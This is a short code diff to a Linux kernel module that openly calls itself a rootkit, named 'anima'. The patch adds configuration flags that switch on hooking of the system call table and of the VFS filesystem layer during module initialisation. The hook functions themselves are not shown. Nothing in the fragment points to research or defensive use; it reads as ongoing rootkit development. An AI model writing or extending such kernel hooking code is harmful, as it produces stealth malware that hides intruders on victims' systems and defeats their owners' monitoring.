@@ -14,6 +14,8 @@ struct rootkit_config rk_cfg = {
 	.state = RK_BOOT,
 	.dr_protect = 0,
 	.patch_debug = 1,
+	.hook_syscall = 1,
+	.hook_vfs = 1,
 };
 
 static int __init anima_init(void)
@@ -32,7 +34,10 @@ static int __init anima_init(void)
 	if (ret)
 		return 1;
 
-	hook_sys_call_table();
+	if (rk_cfg.hook_syscall)
+		hook_sys_call_table();
+	if (rk_cfg.hook_vfs)
+		hook_vfs();
 
 	rk_cfg.state = RK_ACTIVE;
 
